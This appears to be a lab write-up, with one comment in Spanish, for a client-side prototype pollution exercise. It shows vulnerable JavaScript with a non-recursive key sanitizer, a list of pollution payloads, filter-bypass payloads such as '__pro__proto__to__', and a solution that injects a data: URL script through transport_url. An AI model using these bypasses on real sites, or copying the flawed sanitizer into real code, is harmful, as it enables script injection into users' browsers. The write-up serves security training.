---
title: "4 - Client-side prototype pollution via flawed sanitization"
---

# 4 - Client-side prototype pollution via flawed sanitization

searchLoggerFiltered.js

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

deparamSanitised.js

```javascript
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

            keys = keys.shift().split('[').concat( keys );

            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[sanitizeKey(key)] = i < keys_last
                        ? cur[sanitizeKey(key)] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[sanitizeKey(key)].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[sanitizeKey(key)] = [ obj[key], val ];

                } else {
                    obj[sanitizeKey(key)] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```

```
/?__proto__.foo=bar
/?__proto__[foo]=bar 
/?constructor.prototype.foo=bar
```

Como sanitizeKey no se hace recursivo :

```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

Solución:

```
?__pro__proto__to__[transport_url]=data:,alert(1);
```
